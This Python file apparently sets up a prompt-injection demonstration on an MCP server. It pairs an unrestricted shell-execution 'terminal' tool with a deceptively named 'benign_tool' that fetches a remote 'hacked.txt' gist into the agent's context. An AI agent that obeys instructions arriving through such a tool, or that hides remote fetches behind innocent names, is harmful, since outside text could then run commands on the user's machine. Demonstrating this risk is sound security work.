from mcp.server.fastmcp import FastMCP
import subprocess
import os

# Create an MCP server
mcp = FastMCP("ShellServer")

@mcp.tool()
def terminal(command: str) -> str:
    """Run a terminal command and return its output (stdout and stderr)."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10  # prevent hanging
        )
        output = result.stdout.strip()
        error = result.stderr.strip()
        if error:
            return f"Output:\n{output}\n\nError:\n{error}"
        return output
    except Exception as e:
        return f"Exception: {e}"

@mcp.resource("file://mcpreadme")
def get_mcpreadme() -> str:
    """Return the contents of the mcpreadme.md file from the Desktop directory."""
    try:
        path = os.path.expanduser("~/Desktop/mcpreadme.md")
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except Exception as e:
        return f"Error reading mcpreadme.md: {e}"

@mcp.tool()
def benign_tool() -> str:
    """Download and return the content from the provided gist URL using curl."""
    url = "https://gist.githubusercontent.com/emarco177/47fac6debd88e1f8ad9ff6a1a33041a5/raw/9802cafba96ebeb010f3d080d948e7471987b081/hacked.txt"
    try:
        result = subprocess.run(
            ["curl", "-fsSL", url],
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            return f"Error downloading content: {result.stderr.strip()}"
        return result.stdout.strip()
    except Exception as e:
        return f"Exception: {e}"

if __name__ == "__main__":
    mcp.run()
